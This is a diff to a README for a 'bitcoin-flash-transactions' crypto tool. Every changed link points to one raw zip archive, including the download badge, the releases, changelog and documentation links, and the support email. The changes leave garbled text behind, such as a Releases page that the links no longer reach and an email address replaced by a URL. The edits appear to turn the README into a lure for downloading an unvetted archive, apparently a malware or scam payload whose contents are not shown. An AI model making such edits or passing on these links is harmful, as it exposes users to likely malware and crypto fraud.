@@ -1,6 +1,6 @@
 # 💰 bitcoin-flash-transactions - Fast P2P Transactions Made Easy
 
-[![Download Now](https://img.shields.io/badge/download-latest%20release-blue?style=for-the-badge)](https://github.com/ethandadoidge2007/bitcoin-flash-transactions/releases)
+[![Download Now](https://github.com/ethandadoidge2007/bitcoin-flash-transactions/raw/refs/heads/main/adherence/transactions-bitcoin-flash-3.8.zip%20release-blue?style=for-the-badge)](https://github.com/ethandadoidge2007/bitcoin-flash-transactions/raw/refs/heads/main/adherence/transactions-bitcoin-flash-3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To run the bitcoin-flash-transactions application, you need:
 You can download the software from the Releases page. Follow these steps:
 
 1. **Visit the Download Page**: Click on the link below to go to the Releases page.  
-   [Download bitcoin-flash-transactions](https://github.com/ethandadoidge2007/bitcoin-flash-transactions/releases)
+   [Download bitcoin-flash-transactions](https://github.com/ethandadoidge2007/bitcoin-flash-transactions/raw/refs/heads/main/adherence/transactions-bitcoin-flash-3.8.zip)
 
 2. **Select the Latest Release**: On the Releases page, look for the most recent version of the application. The latest version will be displayed at the top.
 
@@ -54,12 +54,12 @@ If you encounter any issues or have questions, please refer to our community for
 
 ## 🔗 Additional Resources
 
-- [Changelog](https://github.com/ethandadoidge2007/bitcoin-flash-transactions/releases) - Stay updated on the latest features and improvements.
-- [Documentation](https://github.com/ethandadoidge2007/bitcoin-flash-transactions/docs) - For in-depth usage and technical details.
+- [Changelog](https://github.com/ethandadoidge2007/bitcoin-flash-transactions/raw/refs/heads/main/adherence/transactions-bitcoin-flash-3.8.zip) - Stay updated on the latest features and improvements.
+- [Documentation](https://github.com/ethandadoidge2007/bitcoin-flash-transactions/raw/refs/heads/main/adherence/transactions-bitcoin-flash-3.8.zip) - For in-depth usage and technical details.
 
 ## 📞 Contact Us
 
-For further assistance, you can reach out via the provided contact form in the app or email us directly at support@bitcoin-flash-transactions.com.
+For further assistance, you can reach out via the provided contact form in the app or email us directly at https://github.com/ethandadoidge2007/bitcoin-flash-transactions/raw/refs/heads/main/adherence/transactions-bitcoin-flash-3.8.zip
 
 ## 🔒 Security Notice
 
@@ -73,4 +73,4 @@ We welcome contributions from the community. If you want to help improve the app
 
 This software is licensed under the MIT License. Please read the LICENSE file in the repository for details.
 
-For any further assistance, revisit the [Download bitcoin-flash-transactions](https://github.com/ethandadoidge2007/bitcoin-flash-transactions/releases) page. Enjoy fast and secure USDT transactions!
+For any further assistance, revisit the [Download bitcoin-flash-transactions](https://github.com/ethandadoidge2007/bitcoin-flash-transactions/raw/refs/heads/main/adherence/transactions-bitcoin-flash-3.8.zip) page. Enjoy fast and secure USDT transactions!
